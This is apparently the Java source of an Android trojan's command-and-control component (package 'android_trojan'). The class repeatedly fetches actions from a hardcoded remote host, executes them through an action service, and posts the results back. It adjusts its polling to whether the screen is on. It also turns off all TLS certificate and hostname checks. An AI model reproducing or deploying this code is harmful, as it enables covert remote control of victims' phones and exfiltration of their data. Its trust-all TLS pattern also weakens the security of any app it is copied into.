package trojan.android.android_trojan.action;

import android.content.Context;
import android.os.AsyncTask;
import android.util.Log;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.net.MalformedURLException;
import java.net.ProtocolException;
import java.net.URL;
import java.security.KeyManagementException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.cert.X509Certificate;

import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSession;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;



public class ConnectionServerTask extends AsyncTask<Integer, Integer, Integer> {
    private static final String TAG = "ConnectionServerTask";
    private ActionService actionService;
    private String host;
    private String port;
    private URL urlaction;
    private URL urlresult;
    private Context context;
    private long timeon;
    private long timeoff;
    private long time;
    private long detla;
    private String SALT = "LOL";
    private String KEY = null;
    private String HASH = null;

    public ConnectionServerTask(Context context) {
        this.context = context;
        /*this.KEY = SALT + context.getResources().getString(R.string.KEY);
        this.host = context.getResources().getString(R.string.HOST);
        this.port = context.getResources().getString(R.string.PORT);
        this.timeon = Integer.valueOf(context.getResources().getString(R.string.TIMEON));
        this.timeoff = Integer.valueOf(context.getResources().getString(R.string.TIMEOFF));*/
        this.KEY = SALT + "8df639b301a1e10c36cc2f03bbdf8863";
        this.host = "pi.remijouannet.com";
        this.port = "443";
        this.timeon = 4000;
        this.timeoff = 54000;
        this.time = timeon;
    }

    @Override
    protected void onPreExecute() {
        super.onPreExecute();
        acceptAll();
        Log.d(TAG, "onPreExecute");
        actionService = new ActionService(context);
        this.HASH = SHA1(this.KEY);
        try {
            this.urlaction = new URL("https://"+ host +":"+port+"/action");
            this.urlresult = new URL("https://"+ host +":"+port+"/result");
        } catch (MalformedURLException e) {
            e.printStackTrace();
        }

    }

    @Override
    protected Integer doInBackground(Integer... integer) {
        String result;
        long now;
        Log.i(TAG, "doInBackground");
        while (!isCancelled()){
            now = System.currentTimeMillis();

            if (time != timeoff && !Tools.isScreenOn(context)){
                time = timeoff;
            }else if (time != timeon && Tools.isScreenOn(context)){
                time = timeon;
            }

            if (detla > time) {
                result = getHttp(urlaction);
                if (result != null && !result.equals("null")) {
                    postHttp(urlresult, actionService.action(result), this.HASH);
                    detla = 0;
                }
            }
            detla += now;
            Tools.sleep(timeon/2);
        }

        return 0;
    }

    @Override
    protected void onPostExecute(Integer integer) {
        super.onPostExecute(integer);
        Log.d(TAG, "onPostExecute");
    }

    @Override
    protected void onCancelled(Integer integer) {
        super.onCancelled(integer);
        Log.d(TAG, "onCancelled");
    }

    private String getHttp(URL url) {
        Log.d(TAG, "getHttp");
        String result = null;
        acceptAll();
        try {
            HttpsURLConnection conn = (HttpsURLConnection) url.openConnection();
            conn.setReadTimeout(5000);
            conn.setConnectTimeout(5000);
            conn.setRequestMethod("GET");
            conn.setDoInput(true);
            conn.connect();

            if (conn.getResponseCode() == 200){
                result =  convertInputStreamToString(conn.getInputStream());
            }
            conn.disconnect();
        } catch (ProtocolException e) {
            e.printStackTrace();
        } catch (IOException e) {
            Log.d(TAG, e.getMessage());
        }finally {
            return result;
        }
    }

    private String postHttp(URL url, String json, String auth){
        Log.d(TAG, "postHttp");
        String result = null;
        String urlParameters = json;
        acceptAll();
        try {
            HttpsURLConnection conn =
                    (HttpsURLConnection) url.openConnection();
            conn.setReadTimeout(5000);
            conn.setConnectTimeout(5000);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setRequestProperty("charset", "utf-8");
            conn.setRequestProperty("Accept", "application/json");
            if (auth != null)
                conn.setRequestProperty ("Authorization", auth);
            conn.setDoOutput(true);

            DataOutputStream wr = new DataOutputStream(conn.getOutputStream());
            wr.writeBytes(urlParameters);
            wr.flush();
            wr.close();

            if (conn.getResponseCode() == 200){
                result =  convertInputStreamToString(conn.getInputStream());
            }

            conn.disconnect();
        } catch (ProtocolException e) {
            e.printStackTrace();
        } catch (IOException e) {
            Log.d(TAG, e.getMessage());
        }finally {
            return result;
        }
    }

    private String convertInputStreamToString(InputStream inputStream) throws IOException {
        BufferedReader bufferedReader = new BufferedReader( new InputStreamReader(inputStream));
        String line = "";
        String result = "";
        while((line = bufferedReader.readLine()) != null)
            result += line;

        inputStream.close();
        return result;
    }

    private void acceptAll() {
        try {
            SSLContext ctx = SSLContext.getInstance("TLS");
            ctx.init(null, new TrustManager[] {
                    new X509TrustManager() {
                        public void checkClientTrusted(X509Certificate[] chain, String authType) {}
                        public void checkServerTrusted(X509Certificate[] chain, String authType) {}
                        public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[]{}; }
                    }
            }, null);

            HttpsURLConnection.setDefaultSSLSocketFactory(ctx.getSocketFactory());
            HttpsURLConnection.setDefaultHostnameVerifier(new HostnameVerifier() {
                public boolean verify(String hostname, SSLSession session) {
                    return true;
                }
            });
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        } catch (KeyManagementException e) {
            e.printStackTrace();
        }
    }

    private String SHA1(String text)
    {
        String result = null;

        try {
            MessageDigest md = MessageDigest.getInstance("SHA-1");
            md.update(text.getBytes("UTF-8"), 0, text.length());
            byte[] sha1hash = md.digest();
            result = convertToHex(sha1hash);
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }finally {
            return result;
        }
    }

    private String convertToHex(byte[] data) {
        StringBuilder buf = new StringBuilder();
        for (byte b : data) {
            int halfbyte = (b >>> 4) & 0x0F;
            int two_halfs = 0;
            do {
                buf.append((0 <= halfbyte) && (halfbyte <= 9) ? (char) ('0' + halfbyte) : (char) ('a' + (halfbyte - 10)));
                halfbyte = b & 0x0F;
            } while (two_halfs++ < 1);
        }
        return buf.toString();
    }
}
